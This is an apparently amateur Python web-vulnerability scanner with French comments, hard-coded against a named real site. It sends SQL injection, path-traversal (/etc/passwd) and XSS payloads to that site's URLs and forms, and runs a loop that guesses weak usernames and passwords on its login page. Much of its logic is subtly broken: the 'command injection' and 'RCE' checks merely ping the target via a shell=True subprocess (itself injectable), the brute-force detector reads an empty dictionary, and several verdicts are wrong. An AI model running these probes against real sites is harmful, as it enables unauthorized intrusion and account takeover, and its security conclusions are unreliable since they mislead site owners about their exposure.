import re 
import requests
import ssl
import socket
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
import subprocess
from collections import defaultdict

MAX_LOGIN_ATTEMPTS = 20

def check_brute_force_attack(url):
    print("\nDétection des attaques par force brute :")
    # Ici, vous pouvez ajouter le code pour suivre le nombre de tentatives de connexion pour chaque utilisateur.
    # Vous pouvez utiliser une base de données ou une structure de données en mémoire pour stocker les tentatives de connexion.

    login_attempts = defaultdict(int)
    users_with_brute_force_attack = []

    for user, attempts in login_attempts.items():
        if attempts >= MAX_LOGIN_ATTEMPTS:
            users_with_brute_force_attack.append(user)

    if users_with_brute_force_attack:
        problem = "Détection d'attaques par force brute pour les utilisateurs suivants : " + ', '.join(users_with_brute_force_attack)
        solution = "Prenez des mesures pour bloquer les adresses IP ou les utilisateurs qui tentent des attaques par force brute."
    else:
        problem = "Aucune attaque par force brute détectée."
        solution = ""

    return problem, solution



def check_command_injection_vulnerability(url):
    # Code pour vérifier l'injection de commande sur le site
    print("\nVérification de l'injection de commande :")
    test_command = "ping " + url  # Exemple: ping 127.0.0.1

    try:
        output = subprocess.check_output(test_command, shell=True, stderr=subprocess.STDOUT, timeout=5)
        # Si aucune exception n'est levée, l'URL est potentiellement vulnérable
        problem = f"L'URL {url} est potentiellement vulnérable à l'injection de commande."
        solution = "Appliquer la validation des entrées pour éviter l'injection de commande."
    except subprocess.CalledProcessError:
        # Une exception est levée si la commande échoue, ce qui signifie que l'URL n'est probablement pas vulnérable.
        problem = f"L'URL {url} n'est pas vulnérable à l'injection de commande."
        solution = ""
    except subprocess.TimeoutExpired:
        # Si la commande prend trop de temps, considérez l'URL comme non vulnérable.
        problem = f"L'URL {url} n'est pas vulnérable à l'injection de commande (délai d'attente expiré)."
        solution = ""

    return problem, solution 

# Appel de la fonction avec l'URL spécifiée
url = "https://revuecharles.fr/"
check_command_injection_vulnerability(url)

def check_session_hijacking_vulnerability(url):
    # Envoyer une requête GET pour obtenir le cookie de session
    response = requests.get(url)

    # Extraire le cookie de session des en-têtes de la réponse
    cookie_session = response.cookies.get('session')

    # Simuler une attaque de détournement de session en utilisant le même cookie de session
    hijacked_request = requests.get(url, cookies={'session': cookie_session})

    # Vérifier si l'attaque a réussi (comparer les réponses)
    if response.text == hijacked_request.text:
        problem = f"L'URL {url} est potentiellement vulnérable au détournement de session."
        solution = "Utilisez des mécanismes de gestion de session sécurisés tels que des cookies sécurisés (HttpOnly et Secure) et utilisez le protocole HTTPS pour protéger les échanges de données sensibles."
        print(problem)
        print(solution)
    else:
        problem = f"L'URL {url} n'est pas vulnérable au détournement de session."
        solution = None
        print(problem)

    return problem, solution

##### A MODIFIER ######
def check_file_inclusion_vulnerability(url):
    url = "https://revuecharles.fr/"
    # Essayer d'inclure un fichier arbitraire (exemple: /etc/passwd) en utilisant l'URL fournie
    malicious_url = url + '/../../../../../etc/passwd'

    # Envoyer une requête GET pour inclure le fichier
    response = requests.get(malicious_url)

    # Vérifier si le contenu du fichier /etc/passwd est présent dans la réponse
    if "root:x:0:0:" in response.text:
        print(f"L'URL {url} est potentiellement vulnérable à l'inclusion de fichiers.")
    else:
        print(f"L'URL {url} n'est pas vulnérable à l'inclusion de fichiers.")


######## A MODIFIER #####
def check_test_sql_injection_vulnerability(url):
    # Injection SQL malveillante
    payload = "' OR 1=1 --"
    target_url = url + f"?id={payload}"
    
    response = requests.get(target_url)
    
    if "error" in response.text.lower():
        print("Vulnérabilité d'injection SQL détectée.")
    else:
        print("Le site n'est pas vulnérable à l'injection SQL.")

# Exemple d'utilisation avec votre propre URL
url = "https://revuecharles.fr/"
check_test_sql_injection_vulnerability(url)

def check_vulnerable_headers(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    }
    response = requests.get(url, headers=headers)

    # Vérifier les en-têtes pour des vulnérabilités connues
    problem = "\nRésultats du scan pour les en-têtes :"
    solution = None

    if 'Server' in response.headers:
        problem += f'\nEn-tête Server : {response.headers["Server"]}'
        if 'Apache' in response.headers['Server']:
            solution = "Le serveur est Apache. Vérifiez la version pour les vulnérabilités connues."
    if 'X-Powered-By' in response.headers:
        problem += f'\nEn-tête X-Powered-By : {response.headers["X-Powered-By"]}'
        if 'PHP' in response.headers['X-Powered-By']:
            solution = "Le site est propulsé par PHP. Vérifiez la version pour les vulnérabilités connues."
    if 'X-AspNet-Version' in response.headers:
        problem += f'\nEn-tête X-AspNet-Version : {response.headers["X-AspNet-Version"]}'
        solution = "ASP.NET est utilisé. Vérifiez la version pour les vulnérabilités connues."
    if 'X-Frame-Options' in response.headers:
        problem += f'\nEn-tête X-Frame-Options : {response.headers["X-Frame-Options"]}'
        if response.headers['X-Frame-Options'] != 'SAMEORIGIN':
            solution = "Attention : X-Frame-Options n'est pas correctement configuré. Cela pourrait rendre le site vulnérable à une attaque de clickjacking."

    return problem, solution


def check_ssl_vulnerabilities(url):
    results = "\nRésultats du scan pour les vulnérabilités SSL/TLS :"
    problem = None
    solution = None
    try:
        # Activation de la vérification des certificats SSL/TLS
        response = requests.get(url, verify=True)
        if response.status_code == 200:
            results += "\nLe site prend en charge HTTPS."
            # Vérification de la vulnérabilité SSL/TLS ici, par exemple :
            if "TLSv1" in response.text:
                problem = "Le site utilise une version obsolète du protocole TLS (TLSv1)."
                solution = "Mettez à jour la configuration TLS pour utiliser des versions plus récentes et sécurisées du protocole, comme TLSv1.2 ou TLSv1.3."
        else:
            problem = "Le site ne répond pas avec le code d'état 200."
    except requests.exceptions.SSLError as e:
        problem = f"Le site présente des problèmes de certificat SSL : {e}"
        solution = "Vérifiez et corrigez les problèmes de certificat SSL pour assurer une connexion sécurisée."

    results += f"\n{problem}" if problem else ""
    return results, solution

### A MODIFIER #####
def check_sql_injection_vulnerability_advanced(url):
    payloads = ["1' OR '1'='1", "1' OR 1=1 --", "' UNION SELECT username, password FROM users --"]
    print("\nRésultats du scan pour les vulnérabilités d'injection SQL :")
    for payload in payloads:
        test_url = url + "?id=" + payload
        response = requests.get(test_url)

        if "Error in SQL syntax" in response.text:
            print(f"Vulnérabilité d'injection SQL détectée avec la charge utile : {payload}")
            print("Not OK - Vulnérabilité d'injection SQL détectée")

###### A MODIFIER ######
def check_xss_vulnerability_advanced(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')

    print("\nRésultats du scan pour les vulnérabilités XSS :")
    for form in forms:
        form_action = form.get('action', '')
        form_inputs = form.find_all('input')
        for form_input in form_inputs:
            input_name = form_input.get('name', '')
            if input_name:
                payload = f"<script>alert('XSS Vulnerability')</script>"
                data = {input_name: payload}
                response = requests.post(url + form_action, data=data)

                if payload in response.text:
                    print(f"Vulnérabilité XSS détectée dans le formulaire : {form_action} - champ : {input_name}")
                    print("Not OK - Vulnérabilité XSS détectée")

def check_security_headers(url):
    security_headers = {
        'Content-Security-Policy': '',
        'X-XSS-Protection': '',
        'X-Content-Type-Options': ''
    }
    response = requests.get(url)

    results = "\nRésultats du scan pour les en-têtes de sécurité :"
    problem = None
    solution = None
    for header, value in security_headers.items():
        if header in response.headers:
            results += f'\nEn-tête {header} : {response.headers[header]}'
        else:
            results += f'\nEn-tête {header} non défini.'
            if header == 'Content-Security-Policy':
                problem = "L'en-tête Content-Security-Policy n'est pas défini. Cela peut entraîner des risques de sécurité liés à l'exécution de contenu non sécurisé (par exemple, scripts malveillants)."
                solution = "Définissez une politique de sécurité du contenu appropriée dans l'en-tête Content-Security-Policy pour restreindre les origines et les types de contenu autorisés."
            elif header == 'X-XSS-Protection':
                problem = "L'en-tête X-XSS-Protection n'est pas défini. Cela pourrait entraîner des risques de sécurité liés aux attaques de cross-site scripting (XSS)."
                solution = "Définissez l'en-tête X-XSS-Protection avec la valeur appropriée pour activer la protection contre les attaques de cross-site scripting (par exemple, X-XSS-Protection: 1; mode=block)."
            elif header == 'X-Content-Type-Options':
                problem = "L'en-tête X-Content-Type-Options n'est pas défini. Cela peut entraîner des risques de sécurité liés au type de contenu MIME (Content-Type) mal interprété par le navigateur."
                solution = "Définissez l'en-tête X-Content-Type-Options avec la valeur 'nosniff' pour indiquer au navigateur de ne pas deviner le type de contenu et de respecter le type MIME spécifié."

    return results, solution



def check_test_login(username, passwords_list, login_url):
    payload = {
        "username": username,
        "password": password
    }
    response = requests.post(login_url, data=payload)

    if response.status_code == 200 and "Mot de passe incorrect" not in response.text:
        return True
    return False

# Configuration
target_url = "https://revuecharles.fr/mon-compte/"  # Remplacez par l'URL de votre site
login_url = f"{target_url}/login"  # Assurez-vous que c'est l'URL correcte pour la page de connexion
weak_usernames = ['admin', 'user', 'test', 'demo', 'guest', 'revuecharles']
passwords_list = ["admin", "123456", "revuecharles", "revuecharles1234", "admin1234", "password", "qwerty"]

# Test de chaque combinaison
for username in weak_usernames:
    for password in passwords_list:
        if check_test_login(username, passwords_list, login_url):
            print(f"Combinaison valide : nom d'utilisateur='{username}', mot de passe='{password}'")
        else:
            print(f"Combinaison invalide : nom d'utilisateur='{username}', mot de passe='{password}'")



def check_api_security(url):
    # Code pour vérifier la sécurité des API
    print("\nVérification de la sécurité des API :")
    try:
        response = requests.get(url)
        response.raise_for_status()  # Vérifier si la requête a été effectuée avec succès

        api_data = response.json()
        # Si le JSON est correctement formaté, vous pouvez continuer avec le traitement des données.
        # Ajoutez votre code de vérification des API ici

        # Par exemple, vérifier si l'API renvoie des données sensibles ou expose des informations confidentielles.
        if "sensitive_data" in api_data:
            problem = "L'API renvoie des données sensibles, ce qui pourrait poser un risque de sécurité."
            solution = "Assurez-vous que l'API n'expose pas d'informations confidentielles et que les données sensibles sont correctement protégées."

        else:
            problem = "Aucune vulnérabilité de sécurité des API détectée."
            solution = ""

    except requests.exceptions.HTTPError as e:
        problem = f"Erreur HTTP lors de la requête : {e}"
        solution = "Vérifiez le point d'accès au site pour vous assurer qu'il fonctionne correctement."
    except requests.exceptions.RequestException as e:
        problem = f"Erreur lors de la requête : {e}"
        solution = "Vérifiez la connectivité réseau et assurez-vous que le serveur est accessible."
    except requests.exceptions.JSONDecodeError as e:
        problem = f"Erreur de décodage JSON : {e}"
        solution = "Assurez-vous que la réponse de l'API est correctement formatée en JSON."

    return problem, solution


def check_ddos_vulnerability(url):
    # Nombre de requêtes GET à envoyer pour évaluer la résistance au DDoS
    num_requests = 10

    # Effectuer plusieurs requêtes GET pour évaluer la résistance au DDoS
    results = "\nVérification de la vulnérabilité aux attaques par déni de service distribué (DDoS) :"
    problem = None
    solution = None

    for i in range(num_requests):
        response = requests.get(url)

        if response.status_code != 200:
            problem = "Le site a répondu avec un code d'état différent de 200 lors de la vérification du DDoS."
            solution = "Assurez-vous que le site est capable de gérer correctement un grand nombre de requêtes pour se protéger contre les attaques DDoS."

            # Sortir de la boucle dès qu'une requête échoue
            break

    results += f"\n{problem}" if problem else ""
    return results, solution

def check_file_upload_security(url):
    # URL de test pour le téléchargement de fichiers (à remplacer par l'URL réelle du point de téléchargement)
    upload_url = url + "/upload"

    # Données du fichier à télécharger (à remplacer par des données réelles si nécessaire)
    files = {'file': ('test.txt', b'Contenu du fichier de test')}

    # Effectuer une requête POST pour simuler le téléchargement de fichier
    response = requests.post(upload_url, files=files)

    # Vérifier la réponse pour détecter d'éventuelles vulnérabilités de téléchargement de fichiers
    results = "\nVérification de la sécurité du téléchargement de fichiers :"
    problem = None
    solution = None

    if response.status_code == 200:
        if 'success' in response.json() and response.json()['success']:
            results += "\nLe téléchargement de fichier semble sécurisé."
        else:
            problem = "Le téléchargement de fichier semble vulnérable à des attaques telles que l'injection de fichier malveillant."
            solution = "Assurez-vous de mettre en place des contrôles de sécurité appropriés lors du téléchargement de fichiers, tels que la validation des types de fichiers, la désactivation de l'exécution de fichiers sur le serveur, et la limitation des droits d'accès aux fichiers téléchargés."

    else:
        problem = "Le téléchargement de fichier n'a pas abouti avec le code d'état 200."
        solution = "Vérifiez le point de téléchargement de fichiers pour vous assurer qu'il fonctionne correctement."

    results += f"\n{problem}" if problem else ""
    return results, solution


def check_cookie_security(url):
    # Effectuer une requête GET pour obtenir les cookies du site
    response = requests.get(url)

    # Vérifier la sécurité des cookies renvoyés
    results = "\nVérification de la sécurité des cookies :"
    problem = None
    solution = None

    if response.status_code == 200:
        # Récupérer les cookies renvoyés dans la réponse
        cookies = response.cookies

        # Vérifier si les cookies sont sécurisés (HttpOnly et Secure)
        for cookie in cookies:
            if not cookie.secure:
                problem = f"Le cookie '{cookie.name}' n'est pas sécurisé (Secure)."
                solution = "Définissez le cookie avec l'attribut Secure pour empêcher la transmission du cookie sur des connexions HTTP non sécurisées."
                break
            if not cookie.has_nonstandard_attr('HttpOnly'):
                problem = f"Le cookie '{cookie.name}' n'est pas sécurisé (HttpOnly)."
                solution = "Définissez le cookie avec l'attribut HttpOnly pour empêcher l'accès JavaScript au cookie et réduire les risques d'attaques de type XSS."
                break

    else:
        problem = "La récupération des cookies n'a pas abouti avec le code d'état 200."
        solution = "Vérifiez le point d'accès au site pour vous assurer qu'il fonctionne correctement."

    results += f"\n{problem}" if problem else ""
    return results, solution

def check_email_security(url):
    # Effectuer une requête GET pour obtenir le contenu de la page
    response = requests.get(url)

    # Vérifier la sécurité des adresses e-mail exposées
    results = "\nVérification de la sécurité des adresses e-mail :"
    problem = None
    solution = None

    if response.status_code == 200:
        page_content = response.text

        # Utiliser une expression régulière pour rechercher des adresses e-mail dans le contenu de la page
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        emails_found = re.findall(email_pattern, page_content)

        if emails_found:
            problem = "Des adresses e-mail sont potentiellement exposées sur le site."
            solution = "Évitez d'afficher des adresses e-mail directement sur le site. Utilisez plutôt des formulaires de contact ou des méthodes de communication sécurisées pour permettre aux utilisateurs de vous contacter sans exposer leurs adresses e-mail."

    else:
        problem = "La vérification de la sécurité des adresses e-mail n'a pas abouti avec le code d'état 200."
        solution = "Vérifiez le point d'accès au site pour vous assurer qu'il fonctionne correctement."

    results += f"\n{problem}" if problem else ""
    return results, solution

def check_robots_sitemap_security(url):
    # URL des fichiers robots.txt et sitemap.xml
    robots_url = url + "/robots.txt"
    sitemap_url = url + "/sitemap.xml"

    # Effectuer une requête GET pour récupérer le contenu de robots.txt
    response_robots = requests.get(robots_url)

    # Effectuer une requête GET pour récupérer le contenu de sitemap.xml
    response_sitemap = requests.get(sitemap_url)

    # Vérifier la sécurité des fichiers robots.txt et sitemap.xml
    results = "\nVérification de la sécurité des fichiers robots.txt et sitemap.xml :"
    problem = None
    solution = None

    if response_robots.status_code == 200:
        robots_content = response_robots.text

        # Vérifier si des informations sensibles sont exposées dans le fichier robots.txt
        if "Disallow:" in robots_content:
            problem = "Le fichier robots.txt expose des informations sensibles sur les chemins d'accès interdits (Disallow)."
            solution = "Assurez-vous de ne pas exposer d'informations sensibles dans le fichier robots.txt. Utilisez le fichier pour indiquer aux robots d'indexation les parties du site qui doivent être exclues de l'indexation."

    if response_sitemap.status_code == 200:
        sitemap_content = response_sitemap.text

        # Vérifier si des informations sensibles sont exposées dans le fichier sitemap.xml
        if "http://" in sitemap_content or "https://" in sitemap_content:
            problem = "Le fichier sitemap.xml expose des URL absolues contenant des informations sensibles (protocole http ou https)."
            solution = "Utilisez des URL relatives dans le fichier sitemap.xml pour éviter d'exposer des informations sensibles. Les URL relatives sont préférées car elles sont plus flexibles et peuvent être utilisées avec différents protocoles (http ou https)."

    results += f"\n{problem}" if problem else ""
    return results, solution

def check_database_security(url):
    # URL pour tester la sécurité de la base de données (à remplacer par l'URL réelle du point de test)
    db_test_url = url + "/test-database"

    # Effectuer une requête GET pour tester la sécurité de la base de données
    response = requests.get(db_test_url)

    # Vérifier la sécurité de la base de données
    results = "\nVérification de la sécurité de la base de données :"
    problem = None
    solution = None

    if response.status_code == 200:
        # Vérifier si des données sensibles ont été exposées
        if "sensitive_data" in response.json():
            problem = "La base de données expose des données sensibles publiquement."
            solution = "Assurez-vous que l'accès à la base de données est correctement protégé en utilisant des méthodes d'authentification sécurisées et en limitant l'accès aux données sensibles uniquement aux utilisateurs autorisés."

    else:
        problem = "La vérification de la sécurité de la base de données n'a pas abouti avec le code d'état 200."
        solution = "Vérifiez le point de test de la base de données pour vous assurer qu'il fonctionne correctement."

    results += f"\n{problem}" if problem else ""
    return results, solution


def check_compliance_standards(url):
    # URL pour tester la conformité aux normes de sécurité (à remplacer par l'URL réelle du point de test)
    compliance_test_url = url + "/test-compliance"

    # Effectuer une requête GET pour tester la conformité aux normes de sécurité
    response = requests.get(compliance_test_url)

    # Vérifier la conformité aux normes de sécurité
    results = "\nVérification de la conformité aux normes de sécurité :"
    problem = None
    solution = None

    if response.status_code == 200:
        # Vérifier si le site respecte certaines normes de sécurité spécifiques
        compliance_data = response.json()

        if compliance_data.get('pci_dss_compliant', False):
            results += "\nLe site est conforme aux normes de sécurité PCI DSS (Payment Card Industry Data Security Standard)."
        else:
            problem = "Le site n'est pas conforme aux normes de sécurité PCI DSS (Payment Card Industry Data Security Standard)."
            solution = "Assurez-vous que le site respecte les exigences spécifiques de PCI DSS pour le traitement sécurisé des données de carte de crédit."

        if compliance_data.get('hipaa_compliant', False):
            results += "\nLe site est conforme aux normes de sécurité HIPAA (Health Insurance Portability and Accountability Act)."
        else:
            problem = "Le site n'est pas conforme aux normes de sécurité HIPAA (Health Insurance Portability and Accountability Act)."
            solution = "Assurez-vous que le site respecte les exigences spécifiques de HIPAA pour la protection des informations de santé."

    else:
        problem = "La vérification de la conformité aux normes de sécurité n'a pas abouti avec le code d'état 200."
        solution = "Vérifiez le point de test de la conformité aux normes de sécurité pour vous assurer qu'il fonctionne correctement."

    results += f"\n{problem}" if problem else ""
    return results, solution


def check_server_security(url):
    # Effectuer une requête GET pour obtenir les en-têtes du serveur
    response = requests.get(url)

    # Vérifier la sécurité du serveur
    results = "\nVérification de la sécurité du serveur :"
    problem = None
    solution = None

    if response.status_code == 200:
        # Vérifier les en-têtes du serveur pour détecter d'éventuelles vulnérabilités
        server_headers = response.headers

        if 'Server' in server_headers:
            server_header = server_headers['Server']
            if 'Apache' in server_header:
                problem = "Le serveur semble être Apache. Vérifiez la version pour détecter d'éventuelles vulnérabilités connues."
                solution = "Assurez-vous que le serveur Apache est correctement configuré et à jour pour éviter les vulnérabilités connues."

        if 'X-Powered-By' in server_headers:
            x_powered_by_header = server_headers['X-Powered-By']
            if 'PHP' in x_powered_by_header:
                problem = "Le site est propulsé par PHP. Vérifiez la version pour détecter d'éventuelles vulnérabilités connues."
                solution = "Assurez-vous que PHP est correctement configuré et à jour pour éviter les vulnérabilités connues."

    else:
        problem = "La vérification de la sécurité du serveur n'a pas abouti avec le code d'état 200."
        solution = "Vérifiez le point d'accès au site pour vous assurer qu'il fonctionne correctement."

    results += f"\n{problem}" if problem else ""
    return results, solution

    
def check_js_security(url):
    # Effectuer une requête GET pour obtenir le contenu de la page
    response = requests.get(url)

    # Vérifier la sécurité du code JavaScript du site
    results = "\nVérification de la sécurité du code JavaScript :"
    problem = None
    solution = None

    if response.status_code == 200:
        page_content = response.text

        # Vérifier le code JavaScript pour détecter d'éventuelles vulnérabilités
        # Ajoutez ici votre code de vérification de la sécurité JavaScript
        # Par exemple, recherchez des appels à des fonctions potentiellement dangereuses comme eval() ou des utilisations inappropriées de fonctions comme innerHTML.

        # Exemple de détection de vulnérabilité : utilisation de eval()
        if "eval(" in page_content:
            problem = "Le code JavaScript utilise la fonction eval(), ce qui peut présenter des risques de sécurité importants."
            solution = "Évitez d'utiliser la fonction eval() car elle peut permettre l'exécution de code non sécurisé. Utilisez plutôt des méthodes de traitement de chaînes de caractères plus sûres."

    else:
        problem = "La vérification de la sécurité du code JavaScript n'a pas abouti avec le code d'état 200."
        solution = "Vérifiez le point d'accès au site pour vous assurer qu'il fonctionne correctement."

    results += f"\n{problem}" if problem else ""
    return results, solution


def check_css_security(url):
    print("\nVérification des vulnérabilités de sécurité dans les fichiers CSS :")
    response = requests.get(url)
    css_files = [css_file['href'] for css_file in BeautifulSoup(response.text, 'html.parser').find_all('link', rel='stylesheet')]

    results = ""
    problem = None
    solution = None

    for css_file in css_files:
        if css_file.startswith(('http:', 'https:')):
            css_url = css_file
        else:
            css_url = urljoin(url, css_file)
        css_response = requests.get(css_url)

        # Vérification des vulnérabilités de sécurité dans le fichier CSS
        if "expression(" in css_response.text:
            problem = f"Vulnérabilité détectée dans le fichier CSS : {css_url}"
            solution = "Évitez d'utiliser la propriété 'expression' en CSS car elle peut permettre l'exécution de code non sécurisé. Utilisez plutôt des méthodes CSS modernes pour styliser votre site."

        results += f"\n{problem}" if problem else ""

    return results, solution


def check_csp_security(url):
    # Effectuer une requête GET pour obtenir les en-têtes de la page
    response = requests.get(url)

    # Vérifier la politique de sécurité de contenu (CSP) du site
    results = "\nVérification de la politique de sécurité de contenu (CSP) :"
    problem = None
    solution = None

    if response.status_code == 200:
        # Vérifier les en-têtes CSP pour détecter d'éventuelles vulnérabilités
        csp_header = response.headers.get('Content-Security-Policy', '')
        if not csp_header:
            problem = "La politique de sécurité de contenu (CSP) n'est pas définie sur le site."
            solution = "Mettez en place une politique de sécurité de contenu (CSP) pour aider à protéger votre site contre les attaques de type XSS (Cross-Site Scripting) et autres vulnérabilités."

    else:
        problem = "La vérification de la politique de sécurité de contenu (CSP) n'a pas abouti avec le code d'état 200."
        solution = "Vérifiez le point d'accès au site pour vous assurer qu'il fonctionne correctement."

    results += f"\n{problem}" if problem else ""
    return results, solution


def check_hpkp_security(url):
    # Effectuer une requête GET pour obtenir les en-têtes de la page
    response = requests.get(url)

    # Vérifier l'en-tête de politique de clé publique (HPKP) du site
    results = "\nVérification de l'en-tête de politique de clé publique (HPKP) :"
    problem = None
    solution = None

    if response.status_code == 200:
        # Vérifier l'en-tête HPKP pour détecter d'éventuelles vulnérabilités
        hpkp_header = response.headers.get('Public-Key-Pins', '')
        if not hpkp_header:
            problem = "L'en-tête de politique de clé publique (HPKP) n'est pas défini sur le site."
            solution = "N'utilisez pas HPKP, car il est déprécié et peut entraîner des problèmes de fiabilité. Utilisez plutôt d'autres mécanismes de sécurité tels que le Transport Layer Security (TLS) et les certificats SSL/TLS bien configurés pour sécuriser les connexions."

    else:
        problem = "La vérification de l'en-tête de politique de clé publique (HPKP) n'a pas abouti avec le code d'état 200."
        solution = "Vérifiez le point d'accès au site pour vous assurer qu'il fonctionne correctement."

    results += f"\n{problem}" if problem else ""
    return results, solution

def check_server_configuration(url):
    # Effectuer une requête GET pour obtenir les en-têtes de la page
    response = requests.get(url)

    # Vérifier la configuration du serveur
    results = "\nVérification de la configuration du serveur :"
    problem = None
    solution = None

    if response.status_code == 200:
        # Vérifier les en-têtes du serveur pour détecter d'éventuelles vulnérabilités liées à la configuration
        server_headers = response.headers

        # Exemple de détection de vulnérabilité : désactivation du cache de sécurité du navigateur
        if 'Cache-Control' in server_headers and 'no-store' not in server_headers['Cache-Control']:
            problem = "La configuration du serveur ne désactive pas correctement le cache du navigateur pour les données sensibles."
            solution = "Configurez le serveur pour inclure l'en-tête 'Cache-Control: no-store' afin de désactiver le cache du navigateur pour les données sensibles."

    else:
        problem = "La vérification de la configuration du serveur n'a pas abouti avec le code d'état 200."
        solution = "Vérifiez le point d'accès au site pour vous assurer qu'il fonctionne correctement."

    results += f"\n{problem}" if problem else ""
    return results, solution


def check_secure_cookies(url):
    # Effectuer une requête GET pour obtenir les en-têtes de la page
    response = requests.get(url)

    # Vérifier la sécurité des cookies
    results = "\nVérification de la sécurité des cookies :"
    problem = None
    solution = None

    if response.status_code == 200:
        # Vérifier les cookies pour détecter d'éventuelles vulnérabilités liées à leur sécurisation
        cookies = response.cookies
        for cookie in cookies:
            if not cookie.secure:
                problem = f"Le cookie '{cookie.name}' n'est pas sécurisé (Secure flag non défini)."
                solution = "Définissez le drapeau Secure pour tous les cookies sensibles afin de les transmettre uniquement sur des connexions HTTPS sécurisées."

    else:
        problem = "La vérification de la sécurité des cookies n'a pas abouti avec le code d'état 200."
        solution = "Vérifiez le point d'accès au site pour vous assurer qu'il fonctionne correctement."

    results += f"\n{problem}" if problem else ""
    return results, solution



def check_hsts_security(url):
    # Effectuer une requête GET pour obtenir les en-têtes de la page
    response = requests.get(url)

    # Vérifier la présence de l'en-tête Strict-Transport-Security (HSTS)
    results = "\nVérification de l'en-tête Strict-Transport-Security (HSTS) :"
    problem = None
    solution = None

    if response.status_code == 200:
        # Vérifier la présence de l'en-tête HSTS dans les en-têtes de la réponse
        hsts_header = response.headers.get('Strict-Transport-Security', '')
        if not hsts_header:
            problem = "L'en-tête Strict-Transport-Security (HSTS) n'est pas défini sur le site."
            solution = "Configurez l'en-tête Strict-Transport-Security (HSTS) pour obliger les navigateurs à toujours utiliser HTTPS lorsqu'ils communiquent avec le site."

    else:
        problem = "La vérification de l'en-tête Strict-Transport-Security (HSTS) n'a pas abouti avec le code d'état 200."
        solution = "Vérifiez le point d'accès au site pour vous assurer qu'il fonctionne correctement."

    results += f"\n{problem}" if problem else ""
    return results, solution

def check_csrf_vulnerabilities(url):
    # Effectuer une requête GET pour obtenir le contenu de la page
    response = requests.get(url)

    # Vérifier les vulnérabilités CSRF
    results = "\nVérification des vulnérabilités CSRF :"
    problem = None
    solution = None

    if response.status_code == 200:
        # Analyser le contenu HTML de la page
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Rechercher les formulaires dans le code HTML
        forms = soup.find_all('form')
        for form in forms:
            # Vérifier si le formulaire ne contient pas de token CSRF (par exemple, un champ caché contenant un jeton CSRF)
            csrf_token = form.find('input', {'name': 'csrf_token'})
            if not csrf_token:
                problem = "Le formulaire ne contient pas de token CSRF, ce qui pourrait rendre le site vulnérable à une attaque CSRF."
                solution = "Ajoutez un jeton CSRF (par exemple, un champ caché contenant un jeton CSRF unique) à tous les formulaires pour protéger le site contre les attaques CSRF."

    else:
        problem = "La vérification des vulnérabilités CSRF n'a pas abouti avec le code d'état 200."
        solution = "Vérifiez le point d'accès au site pour vous assurer qu'il fonctionne correctement."

    results += f"\n{problem}" if problem else ""
    return results, solution


def check_pci_dss_compliance(url):
    # Effectuer une requête GET pour obtenir les en-têtes de la page
    response = requests.get(url)

    # Vérifier la conformité PCI DSS
    results = "\nVérification de la conformité PCI DSS :"
    problem = None
    solution = None

    if response.status_code == 200:
        # Vérifier la présence de l'en-tête PCI DSS dans les en-têtes de la réponse
        pci_dss_header = response.headers.get('X-Frame-Options', '')
        if not pci_dss_header:
            problem = "L'en-tête PCI DSS (X-Frame-Options) n'est pas défini sur le site."
            solution = "Configurez l'en-tête X-Frame-Options avec la valeur 'DENY' ou 'SAMEORIGIN' pour protéger contre les attaques de clickjacking."

    else:
        problem = "La vérification de la conformité PCI DSS n'a pas abouti avec le code d'état 200."
        solution = "Vérifiez le point d'accès au site pour vous assurer qu'il fonctionne correctement."

    results += f"\n{problem}" if problem else ""
    return results, solution


def check_is_valid_ssl_certificate(response):
    # Vérifier si la requête a été effectuée via HTTPS
    if not response.url.startswith('https://'):
        problem = "L'URL n'utilise pas HTTPS."
        solution = "Utilisez HTTPS pour chiffrer les communications entre le client et le serveur."

    else:
        # Vérifier si le certificat SSL est valide
        try:
            response.raise_for_status()
            print("Le certificat SSL est valide et émis par une autorité de certification de confiance.")
            return True
        except requests.exceptions.SSLError as e:
            problem = f"Le certificat SSL est invalide : {e}"
            solution = "Assurez-vous que le certificat SSL utilisé par le site est valide et émis par une autorité de certification de confiance."
        except requests.exceptions.RequestException as e:
            problem = f"Erreur lors de la requête HTTPS : {e}"
            solution = "Vérifiez la connectivité réseau et assurez-vous que le serveur est accessible."

    results = "\nVérification du certificat SSL :"
    results += f"\n{problem}" if problem else ""
    return results, solution

def check_form_anti_robots(url):
    print("\nVérification de la sécurité des formulaires anti-robots :")
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    forms_with_captcha = []

    for form in soup.find_all('form'):
        if form.find('input', {'type': 'hidden', 'name': 'recaptcha_response_field'}):
            forms_with_captcha.append(form.get('action', 'No action attribute'))

    if forms_with_captcha:
        problem = "Des formulaires contiennent des protections anti-robots (Captcha, reCAPTCHA)."
        solution = "Les protections anti-robots aident à prévenir les attaques automatisées. Assurez-vous qu'elles sont correctement configurées."
    else:
        problem = "Aucune protection anti-robots (Captcha, reCAPTCHA) trouvée dans les formulaires."
        solution = "Considérez l'ajout de protections anti-robots pour prévenir les attaques automatisées."

    return problem, solution

def check_remote_code_execution(url):
    print("\nVérification de la sécurité des injections de commandes distantes (RCE) :")
    test_command = f"ping {url}"  # Exemple: ping www.example.com

    try:
        output = subprocess.check_output(test_command, shell=True, stderr=subprocess.STDOUT, timeout=5)
        # Si aucune exception n'est levée, l'URL est potentiellement vulnérable
        problem = f"L'URL {url} est potentiellement vulnérable à une injection de commande distante (RCE)."
        solution = "Appliquez la validation des entrées et évitez l'utilisation de fonctions dangereuses telles que eval() ou exec() pour prévenir les attaques RCE."
    except subprocess.CalledProcessError:
        # Une exception est levée si la commande échoue, ce qui signifie que l'URL n'est probablement pas vulnérable.
        problem = f"L'URL {url} n'est pas vulnérable à une injection de commande distante (RCE)."
        solution = ""
    except subprocess.TimeoutExpired:
        # Si la commande prend trop de temps, considérez l'URL comme non vulnérable.
        problem = f"L'URL {url} n'est pas vulnérable à une injection de commande distante (RCE) (délai d'attente expiré)."
        solution = ""

    return problem, solution

def check_security_audit(url):
    print(f"\nCommence l'audit de sécurité pour {url}...")
    status = "OK"  # Variable de statut, initialement définie à "OK"

    check_remote_code_execution(url)
    check_brute_force_attack(url)
    check_command_injection_vulnerability(url)
